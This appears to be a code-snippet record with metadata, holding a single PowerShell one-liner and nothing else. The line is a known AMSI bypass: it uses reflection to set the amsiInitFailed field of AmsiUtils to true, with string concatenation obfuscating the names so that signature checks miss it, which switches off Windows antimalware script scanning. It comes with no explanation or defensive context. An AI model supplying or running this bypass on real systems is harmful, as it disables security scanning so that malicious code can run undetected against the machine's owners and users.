---
id: 91ce0be2-a096-4826-bc60-feef9958a31f
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:26.409542+00:00'
updated_at: '2023-04-10T20:37:02.992728+00:00'
---

# Code Snippet 91ce0be2

**Language**: Powershell

```powershell
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```
